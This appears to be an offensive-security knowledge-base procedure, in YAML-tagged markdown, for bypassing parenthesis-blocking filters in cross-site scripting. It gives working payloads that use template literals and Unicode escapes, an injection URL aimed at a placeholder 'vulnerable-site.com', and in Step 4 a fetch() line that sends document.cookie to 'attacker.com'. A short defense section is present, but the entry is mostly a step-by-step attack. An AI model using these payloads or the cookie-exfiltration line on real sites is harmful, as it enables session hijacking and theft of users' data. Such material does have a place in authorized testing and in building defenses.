---
id: 199d9217-3457-4981-9dad-3fdfe1b117d7
name: Exotic-Payloads-for-Bypassing-Parentheses-in-String-XSS
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:42.539212+00:00'
updated_at: '2023-04-10T20:21:49.873832+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - '[[tags/Bypass-Parentheses-for-String]]'
  - '[[tags/Cross-Site-Scripting]]'
  - '[[tags/Filter-Bypass-and-Exotic-Payloads]]'
commands: []
platforms:
  - Web
tools: []
validated: true
---

# Exotic-Payloads-for-Bypassing-Parentheses-in-String-XSS

## Summary

This procedure demonstrates the use of exotic JavaScript payloads leveraging template literals and Unicode escapes to bypass web application filters that block parentheses in string-based XSS attacks. It enables the injection of malicious scripts to execute JavaScript on vulnerable pages, potentially leading to session hijacking, data theft, or further exploitation.

## Description

Cross-site scripting (XSS) vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. Filters often block common patterns like parentheses in function calls (e.g., alert('xss')) to prevent execution. This procedure uses ES6 template literals (backticks) to invoke functions without parentheses and Unicode escapes (\u0028 for '(') to reconstruct blocked characters. The payload executes an immediate alert and a delayed domain alert, confirming execution in a reflected or stored XSS context. This technique targets JavaScript interpreters in modern browsers and is effective against WAFs or custom filters that fail to normalize Unicode or recognize template syntax. The target environment is typically a web application with unsanitized user input reflected in HTML/JS contexts.

## Requirements

1. Access to a web application vulnerable to XSS where user input is reflected without proper sanitization.
2. Knowledge of the filter's behavior, specifically blocking parentheses in string contexts.
3. A testing environment or proxy tool like Burp Suite to intercept and modify requests.
4. Modern browser supporting ES6 template literals (e.g., Chrome, Firefox).

## Defense

- Implement comprehensive input validation and output encoding using libraries like DOMPurify or OWASP ESAPI to neutralize script tags, events, and special characters.
- Deploy web application firewalls (WAFs) configured to detect and block template literal abuse and Unicode normalization attacks.
- Enable Content Security Policy (CSP) to restrict inline script execution and eval-like functions.
- Regularly scan for XSS vulnerabilities using tools like OWASP ZAP or Burp Suite and apply patches.

## Objectives

1. Bypass parenthesis-blocking filters in XSS payloads to execute JavaScript.
2. Confirm payload execution by displaying alerts with test messages and domain information.
3. Demonstrate potential for stealing sensitive data like cookies or session tokens in a real attack.

## Instructions

### Step 1: Identify the XSS Vulnerability

**Context**: Locate an input field or parameter where user-supplied data is reflected back in a script context without sanitization, and confirm the filter blocks standard payloads like <script>alert('xss')</script> due to parentheses.

Test with a basic payload to verify the vulnerability and filter:

```html
<script>alert('test')</script>
```

> If the filter blocks this, proceed to crafting the exotic payload. Expected output: No execution if filtered; page source shows blocked input.

### Step 2: Craft the Exotic Payload

**Context**: Use template literals to call alert without parentheses and escape the opening parenthesis in the inner alert using Unicode to bypass string filters.

Reference the payload code: [[codes/XSS-Payload-Bypass-Parentheses-with-Template-Literals]]

Substitute any variables if needed (none in this case). The payload is:

```javascript
alert`1`
setTimeout`alert\u0028document.domain\u0029`;
```

> This invokes alert with a template literal displaying '1' immediately. The setTimeout uses a template to execute an alert showing the document domain after a delay (executes immediately without time param). Expected output: Alert box with '1', followed by alert with the page's domain (e.g., 'example.com').

### Step 3: Inject and Test the Payload

**Context**: Inject the payload into the vulnerable input (e.g., URL parameter, form field) and submit to trigger execution.

For a reflected XSS in a search parameter:

```
https://vulnerable-site.com/search?q=<script>alert`1` setTimeout`alert\u0028document.domain\u0029`;</script>
```

Use a proxy to encode if necessary (e.g., URL-encode backticks as %60). Load the page and observe.

> Expected output: Successful alerts confirm bypass. If no execution, inspect for additional filtering (e.g., block backticks) and iterate with variations like using Function constructor.

### Step 4: Verify and Escalate

**Context**: Confirm control by replacing alerts with data exfiltration (e.g., send document.cookie to attacker server) and check for persistence in stored XSS.

Modify payload for exfiltration:

```javascript
fetch('https://attacker.com?cookie='+document.cookie)
```

> Expected output: Network request to attacker server with stolen data. Success indicators: Alert execution, no filter blocks, data received on attacker side.
